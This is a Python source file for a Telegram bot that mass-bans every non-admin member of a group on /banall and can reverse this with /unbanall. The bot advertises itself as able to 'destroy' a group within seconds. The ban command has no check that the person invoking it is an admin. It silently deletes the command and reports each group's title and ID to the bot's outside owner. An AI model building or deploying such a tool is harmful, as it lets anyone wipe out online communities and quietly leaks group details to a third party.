import os
import logging
import asyncio
from os import getenv
from pyrogram import Client, filters, idle
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatMemberStatus
from pyrogram.errors import FloodWait, RPCError

# Logging setup
logging.basicConfig(level=logging.INFO)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

# Bot credentials
API_ID = int(getenv("API_ID"))
API_HASH = getenv("API_HASH")
BOT_TOKEN = getenv("BOT_TOKEN")
OWNER = int(getenv("OWNER"))

# Pyrogram client
app = Client("banall", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Store banned users per group
banned_users_per_chat = {}

# /start command
@app.on_message(filters.command("start") & filters.private)
async def start_command(client, message: Message):
    await message.reply_photo(
        photo="https://files.catbox.moe/o7pv72.jpg",
        caption=f"""**┌────── ˹ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ˼──────•
┆✦ » ʜᴇʏ {message.from_user.mention}
└──────────────────────•
✦ » ɪ'ᴍ ᴀ ᴀᴅᴠᴀɴᴄᴇ ʙᴀɴᴀʟʟ ʙᴏᴛ . 

✦ » ʙᴀɴ ᴏʀ ᴅᴇsᴛʀᴏʏ ᴀʟʟ ᴛʜᴇ ᴍᴇᴍʙᴇʀs ғʀᴏᴍ ᴀ ɢʀᴏᴜᴘ ᴡɪᴛʜɪɴ ᴀ ғᴇᴡ sᴇᴄᴏɴᴅs . 

✦ » ᴄʜᴇᴄᴋ ᴍʏ ᴀʙɪʟɪᴛʏ, ɢɪᴠᴇ ᴍᴇ ᴏɴʟʏ ʙᴀɴ ᴘᴏᴡᴇʀ ᴀɴᴅ ᴛʏᴘᴇ /banall ᴛᴏ ꜱᴇᴇ ᴍᴀɢɪᴄ ɪɴ ɢʀᴏᴜᴘ . 

•──────────────────────•
❖ 𝐏ᴏᴡᴇʀᴇᴅ ʙʏ ➪ [˹ ʙᴏᴛᴍɪɴᴇ-ᴛᴇᴄʜ ˼](https://t.me/BOTMINE_TECH)
•──────────────────────•**""",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✙ ʌᴅᴅ ϻє ɪη ʏσυʀ ɢʀσυᴘ ✙", url=f"https://t.me/{client.me.username}?startgroup=true")],
            [
                InlineKeyboardButton("˹ sυᴘᴘσʀᴛ ˼", url="https://t.me/BOTMINE_SUPPORT"),
                InlineKeyboardButton("˹ υᴘᴅᴧᴛєs ˼", url="https://t.me/BOTMINE_TECH")
            ],
            [
                InlineKeyboardButton("˹ ᴏᴡηᴇʀ ˼", url="https://t.me/NEXIO_O7"),
                InlineKeyboardButton("˹ ᴍᴜsɪᴄ ʙᴏᴛ ˼", url="https://t.me/SanataniiMusicBot")
            ]
        ])
    )

# /banall command
@app.on_message(filters.command("banall") & filters.group)
async def banall(client, message: Message):
    chat_id = message.chat.id
    chat = await client.get_chat(chat_id)
    banned_users_per_chat.setdefault(chat_id, set())

    me = await client.get_me()
    me_id = me.id
    count, failed = 0, 0

    try:
        await message.delete()
    except:
        pass

    try:
        async for member in client.get_chat_members(chat_id):
            uid = member.user.id
            if uid in [me_id, message.from_user.id, OWNER] or member.status in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR]:
                continue
            try:
                await client.ban_chat_member(chat_id, uid)
                banned_users_per_chat[chat_id].add(uid)
                count += 1
                await asyncio.sleep(0.05)
            except FloodWait as e:
                await asyncio.sleep(e.value)
                try:
                    await client.ban_chat_member(chat_id, uid)
                    banned_users_per_chat[chat_id].add(uid)
                    count += 1
                except:
                    failed += 1
            except RPCError:
                failed += 1
    except Exception as e:
        await message.reply(f"Error during banning: {e}")

    msg = (
        f"🚫 **/banall used**\n\n"
        f"**Group:** {chat.title} [`{chat_id}`]\n"
        f"👤 **By:** {message.from_user.mention} (`{message.from_user.id}`)\n"
        f"✅ Banned: `{count}`\n❌ Failed: `{failed}`"
    )
    await client.send_message(OWNER, msg)

# /unbanall command
@app.on_message(filters.command("unbanall") & filters.group)
async def unbanall(client, message: Message):
    chat_id = message.chat.id
    chat = await client.get_chat(chat_id)

    if chat_id not in banned_users_per_chat or not banned_users_per_chat[chat_id]:
        return await message.reply("⚠️ No banned user records found for this group.")

    try:
        await message.delete()
    except:
        pass

    count, failed = 0, 0
    users_to_unban = banned_users_per_chat[chat_id].copy()

    for uid in users_to_unban:
        try:
            await client.unban_chat_member(chat_id, uid)
            banned_users_per_chat[chat_id].remove(uid)
            count += 1
            await asyncio.sleep(0.05)
        except FloodWait as e:
            await asyncio.sleep(e.value)
            try:
                await client.unban_chat_member(chat_id, uid)
                banned_users_per_chat[chat_id].remove(uid)
                count += 1
            except:
                failed += 1
        except RPCError:
            failed += 1

    msg = (
        f"♻️ **/unbanall used**\n\n"
        f"**Group:** {chat.title} [`{chat_id}`]\n"
        f"👤 **By:** {message.from_user.mention} (`{message.from_user.id}`)\n"
        f"✅ Unbanned: `{count}`\n❌ Failed: `{failed}`"
    )
    await client.send_message(OWNER, msg)

# Start bot
app.start()
print("✅ BanAll + UnbanAll Bot Started!")
asyncio.get_event_loop().run_until_complete(idle())
